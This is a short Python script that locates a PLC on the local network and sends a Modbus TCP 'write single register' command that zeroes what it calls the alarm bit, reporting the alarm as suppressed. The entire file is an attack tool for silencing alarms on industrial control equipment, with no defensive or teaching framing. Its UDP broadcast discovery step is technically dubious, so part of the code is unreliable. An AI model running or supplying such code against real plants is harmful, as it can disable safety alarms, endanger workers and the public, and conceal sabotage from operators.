import socket
import struct
import time

# Constants
BROADCAST_IP = '255.255.255.255'
PLC_PORT = 502  # Modbus TCP port
ALARM_BIT_ADDRESS = 0x0001  # Example address of the alarm bit

def find_plc_ip():
    # Broadcast a discovery message to find the PLC's IP address
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(2)  # Set timeout for response

    discovery_message = b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01"  # Example Modbus discovery message
    sock.sendto(discovery_message, (BROADCAST_IP, PLC_PORT))

    try:
        data, addr = sock.recvfrom(1024)
        plc_ip = addr[0]
        print(f"Found PLC at IP: {plc_ip}")
        return plc_ip
    except socket.timeout:
        print("PLC not found on the network.")
        return None

def suppress_alarms(plc_ip):
    # Connect to the PLC and suppress alarms by setting the alarm bit to 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, PLC_PORT))
        
        # Modbus TCP packet to write to a holding register
        transaction_id = 1
        protocol_id = 0
        unit_id = 1
        function_code = 6  # Write single register
        register_address = ALARM_BIT_ADDRESS
        value = 0  # Set alarm bit to 0

        # Build the Modbus TCP packet
        packet = struct.pack('>HHHBBHH', transaction_id, protocol_id, 6, unit_id, function_code, register_address, value)
        sock.send(packet)

        # Read the response
        response = sock.recv(12)
        if response:
            print(f"Alarm suppressed at address {ALARM_BIT_ADDRESS} on PLC {plc_ip}")
        else:
            print("Failed to suppress alarm.")

        sock.close()
    except Exception as e:
        print(f"Error suppressing alarms: {e}")

def main():
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        return

    # Step 2: Suppress alarms on the PLC
    suppress_alarms(plc_ip)

if __name__ == "__main__":
    main()